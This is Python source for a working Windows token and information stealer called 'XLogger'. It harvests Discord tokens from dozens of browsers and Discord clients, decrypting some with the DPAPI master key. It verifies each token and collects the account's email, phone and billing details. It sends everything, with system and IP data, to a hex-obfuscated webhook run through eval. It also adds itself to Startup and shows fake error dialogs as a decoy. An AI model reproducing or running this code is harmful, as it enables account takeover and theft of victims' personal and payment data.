import requests
import base64
import json
import re
import socket
import os
import threading
import shutil
import psutil
import sys
import time
import ctypes
import platform

from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from stuff.msgbox import *
from blahlivmata import hex
from tkinter import messagebox
from conf import *

def sysinfo(webhook):
    plat = platform.system() + " " + platform.release()
    ip = requests.get('https://ipinfo.io/json')
    iplog = ip.json()
    ipadd = iplog.get('ip')
    city = iplog.get('city')
    hostname = iplog.get('hostname')
    region = iplog.get('region')
    country = iplog.get('country')
    loc = iplog.get('loc')
    org = iplog.get('org')
    postal = iplog.get('postal')
    timezone = iplog.get('timezone')
    pcname = socket.gethostname()
    username = os.getenv("USERNAME")
    
    tmp = os.getenv('temp')
    tmpfile = f'{tmp}\\sysinf.txt'
    with open(tmpfile, 'w', encoding='utf-8') as f:
            f.write(f'========PC Info========\n')
            f.write(f'PC Name: {pcname}\n')
            f.write(f'RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB\n')
            f.write(f'OS: {plat}\n')
            f.write(f'Username: {username}\n')
            f.write(f'========IP Info========\n')
            f.write(f'IP Address: {ipadd}\n')
            f.write(f'Hostname: {hostname}\n')
            f.write(f'Location: {city}, {region}, {country}\n')
            f.write(f'Coordinates: {loc}\n')
            f.write(f'Organization: {org}\n')
            f.write(f'Postal: {postal}\n')
    with open(tmpfile, "rb") as f:
        files = {"file": (tmpfile, f)}
        r = requests.post(webhook, files=files)
        if r.status_code in [200, 201, 204]:
            print('successfully sent os info')            
        else:
            payload = {"content":"||@everyone||","embeds":[{"color":3646683,"fields":[{"name":"🖥️ PC Name","value":f"`{pcname}`"},{"name":"🌐 IP Info","value":f"\n`IP Address: {ipadd}`\n`Hostname: {hostname}`\n`Location: {city}, {region}, {country}`\n`Coordinates: {loc}`\n`Organization: {org}`\n`Postal: {postal}`\n`Timezone: {timezone}`"},{"name":"🐏 RAM","value":f"`{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB`"},{"name":"💻 OS","value":f"`{plat}`"},{"name":"👤 User","value":f"`{username}`"}],"footer":{"text":"Logged by XLogger"}}],"username":"TS | System Info","attachments":[]}
            r = requests.post(webhook, json=payload)

def add_to_startup():
    try:
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        exe_path = sys.executable  
        exe_name = os.path.basename(exe_path)
        destination = os.path.join(startup, exe_name)

        if not os.path.exists(destination):
            shutil.copyfile(exe_path, destination)
    except:
        pass



def wbh(hex_code):
    decoded_code = bytes.fromhex(hex_code).decode()  
    
    result = eval(decoded_code) 
    
    return result


regex1 = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
regex2 = r"dQw4w9WgXcQ:[^\"]*"

def decryptv(buff, master_key) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        pass

def get_master_key(path):
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def verify(token):
    headers = {
    'authorization': token,
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0'
    }
    v = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
    if v.status_code in [200, 201, 204]:
        return v.json()
    else:
        return False
        
def sendwebhook(webhook, token, payload):
    embed = payload
    r = requests.post(webhook, json=embed)
    if r.status_code in [200, 201, 204]:
        print('successfully printed to wbh')
    else:
        print(f'failed to print tk to wbh {r.status_code} {r.text}')

def printtk(webhook, token):
    v = verify(token)
    if v:
        userinfo = v
        username = userinfo.get('username', "N/A")
        email = userinfo.get('email', "N/A")
        user_id = userinfo.get('id')
        avatar = userinfo.get('avatar')
        phone = userinfo.get('phone', "N/A")
        bio = userinfo.get('bio') or "None"
        nitro = "True" if userinfo.get("premium_type") else "False"
        mfa = "True" if userinfo.get("mfa_enabled") else "False"
        locale = userinfo.get('locale')
        pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}" if avatar else "None"
        billing_fields = []
        cc_digits = {"visa": "4", "mastercard": "5", "amex": "3", "discover": "6"}

        try:
            billing_req = requests.get(
                'https://discord.com/api/v6/users/@me/billing/payment-sources',
                headers=headers,
            )

            if billing_req.status_code == 200 and isinstance(billing_req.json(), list) and billing_req.json():
                for x in billing_req.json():
                    y = x['billing_address']
                    name = y['name']
                    address_1 = y['line_1']
                    address_2 = y.get('line_2', '')
                    city = y['city']
                    postal_code = y['postal_code']
                    state = y.get('state', '')
                    country = y['country']

                    if x['type'] == 1:
                        cc_brand = x['brand']
                        cc_first = cc_digits.get(cc_brand.lower(), '*')
                        cc_last = x['last_4']
                        cc_month = str(x['expires_month']).zfill(2)
                        cc_year = str(x['expires_year'])

                        cc_number = ''.join(
                            z if (i + 1) % 2 else z + ' '
                            for i, z in enumerate(cc_first + ('*' * 11) + cc_last)
                        )

                        value = (
                            f"💳 **Credit Card**\n"
                            f"• Holder: `{name}`\n"
                            f"• Brand: `{cc_brand}`\n"
                            f"• Number: `{cc_number}`\n"
                            f"• Expiry: `{cc_month}/{cc_year[2:4]}`\n"
                            f"• Address: `{address_1} {address_2}`\n"
                            f"• City/State: `{city}, {state}`\n"
                            f"• Country: `{country}`\n"
                            f"• ZIP: `{postal_code}`\n"
                            f"• Default: `{x['default']}`\n"
                            f"• Valid: `{not x['invalid']}`"
                        )

                    elif x['type'] == 2:
                        value = (
                            f"🅿️ **PayPal**\n"
                            f"• Name: `{name}`\n"
                            f"• Email: `{x['email']}`\n"
                            f"• Address: `{address_1} {address_2}`\n"
                            f"• City/State: `{city}, {state}`\n"
                            f"• Country: `{country}`\n"
                            f"• ZIP: `{postal_code}`\n"
                            f"• Default: `{x['default']}`\n"
                            f"• Valid: `{not x['invalid']}`"
                        )

                    billing_fields.append({
                        "name": "💰 Billing Info",
                        "value": value,
                        "inline": False
                    })
            else:
                billing_fields.append({
                    "name": "💰 Billing Info",
                    "value": "`None`",
                    "inline": False
                })

        except Exception:
            billing_fields.append({
                "name": "💰 Billing Info",
                "value": "`None`",
                "inline": False
            })
        imgurl = pfp if avatar else 'https://discord.com/assets/2ccd8ae8b2379360.png' 
        payload = {
            "content": "||@everyone||",
            "embeds": [
                {
                    "color": 3646683,
                    "thumbnail": {
                        "url": imgurl
                    },

                    "fields": [
                        {"name": "👤 Username", "value": f"`{username}`"},
                        {"name": "🪙 Token", "value": f"`{token}`"},
                        {"name": "✉️ Email", "value": f"`{email}`"},
                        {"name": "📞 Phone", "value": f"`{phone}`"},
                        {"name": "🤔 Bio", "value": f"`{bio}`"},
                        {"name": "📷 PFP", "value": f"{pfp}"},
                        {"name": "🔑 2FA", "value": f"`{mfa}`"},
                        {"name": "💔 Nitro", "value": f"`{nitro}`", "inline": True},
                        {"name": "🤓 Locale", "value": f"`{locale}`"},
                        *billing_fields
                    ],
                    "footer": {"text": "Logged by XLogger"}
                }
            ],
            "username": "TS | Valid",
            "attachments": []
        }

        sendwebhook(webhook, token, payload)
    else:
        pass
#       0 = regular
#       1 = decrypt 
#       2 = no profile/no one would make a profile
#       3 = firefox
      
def stealtks():
    
    tokens = set()
    
    roaming = os.getenv('appdata')
    local = os.getenv('localappdata')
    
    paths = {
    '0Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
    '0ChromeSxS': os.path.join(local, 'Google', 'Chrome SxS', 'User Data'),
    '0Comet': os.path.join(local, 'Perplexity', 'Comet', 'User Data'),
    '0ChromeBeta': os.path.join(local, 'Google', 'Chrome Beta', 'User Data'),
    '0ChromeDev': os.path.join(local, 'Google', 'Chrome Dev', 'User Data'),
    '0Amigo': os.path.join(local, 'Amigo', 'User Data'),
    '0Avast': os.path.join(local, 'AVAST Software', 'Browser', 'User Data'),
    '0Chromium': os.path.join(local, 'Chromium', 'User Data'),
    '0Cent': os.path.join(local, 'CentBrowser', 'User Data'),
    '0DuckDuckGo': os.path.join(local, 'Packages', 'DuckDuckGo.DesktopBrowser_ya2fgkz3nks94', 'LocalState', 'EBWebView'),
    '0Comodo': os.path.join(local, 'Comodo', 'Dragon', 'User Data'),
    '0Epic': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
    '0Thorium': os.path.join(local, 'Thorium', 'User Data'),
    '0Cromite': os.path.join(local, 'Cromite', 'User Data'),
    '0CocCoc': os.path.join(local, 'CocCoc', 'Browser', 'User Data'),
    '0Hola': os.path.join(roaming, 'Hola', 'chromium_profile'),
    '0Iridium': os.path.join(local, "Iridium", "User Data"),
    '0Vivaldi': os.path.join(local, 'Vivaldi', 'User Data'),
    '0Yandex': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data'),
    '0Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
    '0EdgeSxS': os.path.join(local, 'Microsoft', 'Edge SxS', 'User Data'),
    '0EdgeDev': os.path.join(local, 'Microsoft', 'Edge Dev', 'User Data'),
    '0Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    '1Discord': os.path.join(roaming, 'discord'),
    '1DiscordPTB': os.path.join(roaming, 'discordptb'),
    '1DiscordCanary': os.path.join(roaming, 'discordcanary'),
    '1Lightcord': os.path.join(roaming, 'Lighcord'),
    '2OperaOld': os.path.join(roaming, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
    '2Operanew': os.path.join(roaming, 'Opera Software', 'Opera Stable', 'Default', 'Local Storage', 'leveldb'),
    '2OperaGXOld': os.path.join(roaming, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
    '2OperaGXNew': os.path.join(roaming, 'Opera Software', 'Opera GX Stable', 'Default', 'Local Storage', 'leveldb'),
    '2OperaAir': os.path.join(roaming, 'Opera Software', 'Opera Air Stable', 'Default', 'Local Storage', 'leveldb'),
    '2Legcord': os.path.join(roaming, 'legcord', 'Local Storage', 'leveldb'),
    '3FireFox': os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles'),
    '3WaterFox': os.path.join(roaming, 'Waterfox', 'Profiles'),
    '3LibreWolf': os.path.join(roaming, 'LibreWolf', 'Profiles'),
}
    #this is doing way too much for a token stealer
    for browser, path in paths.items():
        if not os.path.exists(path):
            continue
            
        if browser.startswith('0'):
            ps = os.listdir(path)
            for prof in ps:
                if prof.lower() == 'default' or prof.lower().startswith('profile'):
                    pr_path = os.path.join(path, prof)
                    ldb = os.path.join(pr_path, 'Local Storage', 'leveldb')                    
                    tkdb = os.listdir(ldb)
                    for file in tkdb:
                        if not file.endswith('.log') and not file.endswith('.ldb'):
                            continue
                        else:
                            fn = os.path.join(ldb, file)
                            try:
                                with open(fn, errors="ignore", encoding="utf-8") as f:
                                    gnw = f.read()
                                    match = re.findall(regex1, gnw)
                                    for m in match:
                                        tokens.add(m)
                            except:
                                pass
        elif browser.startswith('1'):
            local_state = os.path.join(path, 'Local State')
            key = get_master_key(local_state)
            
            ldb = os.path.join(path, 'Local Storage', 'leveldb')
            tkdb = os.listdir(ldb)
            for file in tkdb:
                fn = os.path.join(ldb, file)
                try:
                    with open(fn, errors="ignore", encoding="utf-8") as f:
                        gnw = f.read()
                        match = re.findall(regex2, gnw)
                        if match:
                            for m in match:
                                enc = m.split('dQw4w9WgXcQ:')[1]
                                enc = base64.b64decode(enc)
                                t = decryptv(enc, key)
                                if not t is None:
                                   tokens.add(t)
                except:
                    pass
                            
        elif browser.startswith('2'):
            tkdb = os.listdir(path)
            for file in tkdb:
                if not file.endswith('.log') and not file.endswith('.ldb'):
                    continue
                else:
                    fn = os.path.join(path, file)
                    try:
                        with open(fn, errors="ignore", encoding="utf-8") as f:
                            gnw = f.read()
                            match = re.findall(regex1, gnw)
                            for m in match:
                                tokens.add(m)
                    except:
                        pass
        elif browser.startswith('3'):
            prof = os.listdir(path)
            for profpth in prof:
                ldb = os.path.join(path, profpth, 'storage', 'default')
                if not os.path.exists(ldb):
                    continue
                for discord in ['https+++discord.com', 'https+++canary.discord.com', 'https+++ptb.discord.com']:
                    tkdb = os.path.join(ldb, discord, 'ls', 'data.sqlite')
                    if not os.path.exists(tkdb):
                        continue
                    try:
                        with open(tkdb, errors="ignore", encoding="utf-8") as f:
                            gnw = f.read()
                            match = re.findall(regex1, gnw)
                            for m in match:
                                tokens.add(m)
                    except:
                        pass
                
    print(tokens)
    print(str(len(tokens)), 'tokens logged')
    return tokens
    
def main():

    if strtup:
        add_to_startup() #persistence (every time the victim turns on their computer the file will run)
        

    if errerror:
        if errtype.lower() == 'error':
            ctypes.windll.user32.MessageBoxW(0, errmg if errmg else 'An unexpected error occurred. (0x8007000D).', "Critical Error", 16)
        elif errtype.lower() == 'info':
            ctypes.windll.user32.MessageBoxW(0, errmg if errmg else 'Program is about to install C++ Redistributable 2012.', "Info", 64)
        elif errtype.lower() == 'warning':
            ctypes.windll.user32.MessageBoxW(0, errmg if errmg else 'Administrator privaleges are required, however you can run this without it.', "Warning", 48)


    tks = stealtks()
    wb = wbh(hex)
    sysinfo(wb)
    for token in tks:
        printtk(wb, token)
        time.sleep(1)
        
        

main()
